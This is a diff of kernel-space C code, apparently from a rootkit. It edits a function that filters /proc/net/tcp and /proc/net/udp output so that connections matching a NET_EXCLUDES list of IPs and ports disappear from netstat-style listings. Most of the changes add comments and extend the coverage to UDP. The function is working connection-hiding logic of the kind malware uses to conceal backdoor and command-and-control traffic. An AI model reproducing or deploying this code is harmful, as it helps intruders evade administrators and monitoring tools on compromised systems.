@@ -45,24 +45,24 @@ int should_exclude_line(const char *line) {
 }
 
 /*
- * filter_netstat_lines - Filter out lines from a netstat output buffer (from /proc/net/tcp)
+ * filter_netstat_lines - Filter out lines from a netstat output buffer (from /proc/net/tcp or /proc/net/udp)
  * that contain any of the IPs or PORTS defined in the global NET_EXCLUDES macro.
  */
 char *filter_netstat_lines(const char *buf, size_t *new_len) {
     size_t buf_len = strlen(buf);
     char *new_buf;
     size_t out_index = 0;
-    const char *line_start = buf;
+    const char *line_start = buf; // ptr to the start of the current line
     const char *line_end;
 
-    new_buf = kmalloc(buf_len + 1, GFP_KERNEL);
+    new_buf = kmalloc(buf_len + 1, GFP_KERNEL); // buffer for new filtered content (same or samller)
     if (!new_buf) {
         return NULL;
     }
     while (line_start < buf + buf_len) {
         line_end = strchr(line_start, '\n');
-        if (!line_end) {
-            line_end = buf + buf_len;
+        if (!line_end) { 
+            line_end = buf + buf_len; // if '\n' not found, this is the last line
         }
         {
             size_t line_len = line_end - line_start;
@@ -72,21 +72,21 @@ char *filter_netstat_lines(const char *buf, size_t *new_len) {
                 skip_line = true;
             }
 
-            if (!skip_line) {
+            if (!skip_line) { // if not excluded, copy the line into the output buffer
                 memcpy(new_buf + out_index, line_start, line_len);
                 out_index += line_len;
                 if (*line_end == '\n')
                     new_buf[out_index++] = '\n';
             }
         }
-        if (*line_end == '\n') {
+        if (*line_end == '\n') { // add back '\n' if it was part of the original line
             line_start = line_end + 1;
         }
         else {
             break;
         }
     }
-    new_buf[out_index] = '\0';
+    new_buf[out_index] = '\0'; // null-terminate the filtered output
     if (new_len) {
         *new_len = out_index;
     }
